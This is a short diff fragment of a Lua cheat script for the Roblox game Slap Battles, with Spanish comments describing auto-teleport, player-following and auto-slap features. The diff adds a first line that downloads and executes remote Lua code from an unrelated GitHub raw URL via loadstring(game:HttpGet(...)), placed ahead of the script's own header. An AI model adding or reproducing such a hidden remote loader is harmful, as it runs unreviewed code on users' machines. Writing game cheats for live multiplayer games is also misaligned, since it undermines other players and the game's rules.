@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/92e8gh9ergwegnixc/loaderss/refs/heads/main/new%20loader.lua"))()
 -- Slap Battles — Script Final Integrado (remotes load/unload on demand + one-shot FPS button)
 -- Versión corregida: TP al portal, seguir jugadores y slap a <=7 studs si no están ragdolled.
 
